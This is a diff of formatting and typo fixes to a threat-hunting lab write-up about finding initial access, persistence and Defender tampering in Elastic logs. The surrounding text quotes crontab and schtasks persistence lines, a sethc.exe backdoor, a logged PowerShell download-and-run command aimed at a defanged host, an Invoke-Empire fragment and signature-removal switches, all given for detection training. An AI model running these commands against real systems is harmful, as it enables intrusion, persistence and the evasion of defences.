@@ -84,7 +84,7 @@ Supply Chain (T1195)          █████                 ~15%
 
 ---
 
-> Gaining a foothold (initial access) does not pertain to compromising one specific host, but rather anything that can be leverages to access the target infrastructure. 
+> Gaining a foothold (initial access) does not pertain to compromising one specific host, but rather anything that can be leveraged to access the target infrastructure. 
 {: .prompt-info}
 
 --- 
@@ -280,6 +280,7 @@ Also **PHP**, often when there are web applications involved.
 | Scheduled Task | T1053.005 | Windows |
 | Systemd Timers | T1053.006 | Linux |
 | Container Orchestration Job | T1053.007 | Kubernetes |
+
 ```bash
 echo "* * * * * /tmp/malware.sh" >> /etc/crontab
 schtasks /create /tn "WindowsUpdate" /tr "C:\malware.exe" /sc onlogon
@@ -346,10 +347,10 @@ Use the discover tab, and start with the following query:
 host.name: WKSTN-* AND winlog.event_id: 1 AND process.name: (cmd.exe OR powershell.exe)
 ```
 
-There are many suspicious commands, and they are as follows (host, user.name, command_line, parent_command_line):
+There are many suspicious commands, and they are as follows (**host, user.name, command_line, parent_command_line**):
 
- ```
-	WKSTN-2.threathunting.thm
+```
+WKSTN-2.threathunting.thm
 bill.hawkins
 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -windowstyle hidden iex(iwr hxxp[://]www[.]oneedirve[.]xyz/321c3cf/INSTALL[.]txt -useb)
 C:\Windows\Explorer.EXE
@@ -412,7 +413,7 @@ Another way to hunt for Powershell execution is, through Powershell's **Script B
 ![Removing "Set-StrictMode" events]({{ "assets/img/foothold_elastic_script_block_text.png" | relative_url }})
 
 ```
-	WKSTN-1.threathunting.thm
+WKSTN-1.threathunting.thm
 function Invoke-Empire {
     param(
         [Parameter(Mandatory=$true)]
@@ -566,7 +567,7 @@ host.name: WKSTN-* AND (*DisableRealtimeMonitoring* OR *RemoveDefinitions*)
 ```
 
 - **DisableRealtimeMonitoring**: often used with Powershell's `Set-MPPreference`
-- **RemoveDefinition** : often used with built-in MpCmdRun.exe (Windows Defender command line) to remove existing signatures of Windows Defender.
+- **RemoveDefinition** : often used with built-in MpCmdRun.exe (**Malware Protection Command Line Utility**, Windows Defender command line) to remove existing signatures of Windows Defender.
     - `-RemoveDefinition` rolls back the version to previous update. So new hash signatures of malwares are removed, the ones that came with the latest update. 
     - `-RemoveDefinition -all` removes all signatures. Defender has no signatures. **It cannot detect known threats**. 
 
@@ -692,12 +693,12 @@ copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
 
 | Event ID | Log | What to Hunt |
 |---|---|---|
-| **4698 | Security | Scheduled task created** |
+| **4698** | Security | **Scheduled task created** |
 | 7045 | System | New service installed |
 | 4720 | Security | New user account created |
 | 4732 | Security | User added to admin group |
 | 4657 | Security | Registry Run key modified |
-| **12/13 | Sysmon | Registry persistence keys** |
+| **12/13** | Sysmon | **Registry persistence keys** |
 | 11 | Sysmon | File in Startup folder |
 
 ---
